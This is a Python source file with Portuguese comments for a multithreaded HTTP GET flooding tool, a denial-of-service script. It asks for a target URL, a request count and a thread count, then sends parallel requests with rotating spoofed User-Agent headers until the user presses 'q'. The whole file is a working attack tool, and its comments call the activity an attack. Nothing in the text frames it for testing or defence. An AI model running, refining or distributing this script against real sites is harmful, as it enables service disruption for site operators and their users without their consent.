import requests
import threading
import random
import time
import keyboard
from colorama import init, Fore, Style

# Inicializar colorama
init()
intro = f"""{Fore.RED}
            | $$  | $$| $$$ | $$ /$$$$$$$           | $$        
            | $$  | $$| $$$$| $$| $$  \\ _/  /$$$$$$ | $$        
            | $$$$$$$$| $$ $$ $$| $$ /$$$$ /$$__  $$| $$        
            |_____  $$| $$  $$$$| $$|_  $$| $$$$$$$$| $$        
                  | $$| $$\\  $$$| $$  \\ $$| $$_____/| $$        
                  | $$| $$ \\  $$|  $$$$$$/|  $$$$$$$| $$$$$$$$  
                  |__/|__/  \\__/ \\______/  \\_______/|________/ BETA
{Style.RESET_ALL}"""

print(intro)
print("\033[91m") 

# Lista de User-Agents variados
user_agents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.19582',
    'Mozilla/5.0 (X11) AppleWebKit/62.41 (KHTML, like Gecko) Edge/17.10859 Safari/452.6',
    'Mozilla/5.0 (Linux; U; Android 4.0.3; ko-kr; LG-L160L Build/IML74K) AppleWebkit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30',
    'Mozilla/5.0 (Linux; U; Android 4.0.3; de-ch; HTC Sensation Build/IML74K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30',
    'Mozilla/5.0 (Linux; U; Android 2.3; en-us) AppleWebKit/999+ (KHTML, like Gecko) Safari/999.9',
    'Mozilla/5.0 (Linux; U; Android 2.3.5; zh-cn; HTC_IncredibleS_S710e Build/GRJ90) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
    'Mozilla/5.0 (Linux; U; Android 2.3.4; fr-fr; HTC Desire Build/GRJ22) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1'
]

# Variável de controle para parar o ataque
stop_attack = False

# Função para escolher um User-Agent aleatoriamente
def get_random_user_agent():
    return random.choice(user_agents)

# Função para enviar solicitações HTTP GET em um loop com timeouts ofensivos
def slow_get(url, num_requests):
    global stop_attack
    for _ in range(num_requests):
        if stop_attack:
            break
        try:
            headers = {
                'User-Agent': get_random_user_agent(),
                'Accept-Language': 'en-US,en;q=0.5',  # Exemplo de variação no header HTTP
                'Referer': 'https://pherazone.com'  # Exemplo de variação no header HTTP
            }
            response = requests.get(url, headers=headers, timeout=(5, 10))
            print(f"Solicitação GET enviada para {url}, Status: {response.status_code}")
            time.sleep(1)  # Espera de 2 segundos entre cada solicitação
        except requests.exceptions.Timeout:
            print(f"Timeout ao enviar solicitação GET para {url}: Tempo de conexão excedido")
        except requests.exceptions.RequestException as e:
            print(f"Erro ao enviar solicitação GET para {url}: {e}")

# Função para monitorar a tecla de parada
def monitor_stop_key():
    global stop_attack
    while True:
        if keyboard.is_pressed('q'):
            stop_attack = True
            print("Parando o ataque...")
            break
        time.sleep(1)

# Função principal
def main():
    url = input("Insira o URL alvo: ")
    num_requests = int(input("Insira o número de solicitações a serem enviadas por thread: "))
    num_threads = int(input("Insira o número de threads: "))

    # Iniciar thread para monitorar a tecla de parada
    stop_thread = threading.Thread(target=monitor_stop_key)
    stop_thread.start()

    # Criar threads para enviar solicitações em paralelo
    threads = []
    for _ in range(num_threads):
        thread = threading.Thread(target=slow_get, args=(url, num_requests))
        threads.append(thread)
        thread.start()

    # Aguardar todas as threads concluírem
    for thread in threads:
        thread.join()

    # Aguardar a thread de monitoramento de parada
    stop_thread.join()

if __name__ == "__main__":
    main()
